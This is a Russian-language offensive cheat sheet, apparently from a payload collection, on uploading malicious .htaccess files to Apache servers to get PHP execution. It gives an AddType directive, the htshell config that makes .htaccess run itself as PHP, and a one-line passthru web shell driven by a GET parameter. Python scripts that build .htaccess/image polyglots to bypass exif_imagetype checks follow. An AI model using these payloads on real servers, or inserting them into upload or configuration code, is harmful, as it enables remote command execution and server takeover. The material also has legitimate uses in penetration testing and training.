> Загрузка файла .htaccess для переопределения правил Apache и выполнения PHP. «Также можно использовать трюки с файлом ".htaccess" для загрузки вредоносного файла с любым расширением и его выполнения. В качестве простого примера представьте загрузку на уязвимый сервер файла .htaccess, который содержит конфигурацию AddType application/x-httpd-php .htaccess и одновременно код PHP-шелла. Из-за вредоносного файла .htaccess веб-сервер начинает рассматривать сам файл .htaccess как исполняемый PHP-файл и выполняет содержащийся в нем вредоносный PHP-код. Важно отметить: конфигурации в .htaccess применяются только для той же директории и её поддиректорий, куда файл .htaccess был загружен».

* [Директива AddType](#Директива-AddType)
* [Автономный .htaccess (Self Contained)](#Автономный-htaccess-Self-Contained)
* [Полиглот .htaccess](#Полиглот-htaccess)

# Директива AddType

* Загрузи файл .htaccess с содержимым:```AddType application/x-httpd-php .rce``` Затем загрузите любой файл с расширением .rce.

# Автономный .htaccess (Self Contained)

```
# Автономный веб-шелл в .htaccess - часть проекта htshell
# Написал Wireghoul - http://www.justanotherhacker.com

# Переопределяем правило запрета по умолчанию, чтобы сделать файл .htaccess доступным через веб
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Заставляем интерпретировать файл .htaccess как php-файл. Это происходит после того,
# как Apache обработал директивы из самого файла .htaccess
AddType application/x-httpd-php .htaccess
```
```
###### ШЕЛЛ ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

# Полиглот .htaccess

Если на стороне сервера используется функция exif_imagetype для определения типа изображения, можно создать файл-полиглот, который одновременно является и .htaccess, и изображением.

[Поддерживаемые типы изображений](https://www.php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) включают [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) и [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). 
Поскольку в ```.htaccess``` игнорируются строки, начинающиеся с ```\x00``` и ```#```, можно использовать следующие скрипты для создания валидного полиглота .htaccess/изображение.

Создание валидного полиглота .htaccess/xbm
```python
width = 50
height = 50
payload = '# .htaccess file'

with open('.htaccess', 'w') as htaccess:
    htaccess.write('#define test_width %d\n' % (width, ))
    htaccess.write('#define test_height %d\n' % (height, ))
    htaccess.write(payload)
```

* Создание валидного полиглота .htaccess/wbmp
```python
type_header = b'\x00'
fixed_header = b'\x00'
width = b'50'
height = b'50'
payload = b'# .htaccess file'

with open('.htaccess', 'wb') as htaccess:
    htaccess.write(type_header + fixed_header + width + height)
    htaccess.write(b'\n')
    htaccess.write(payload)
```
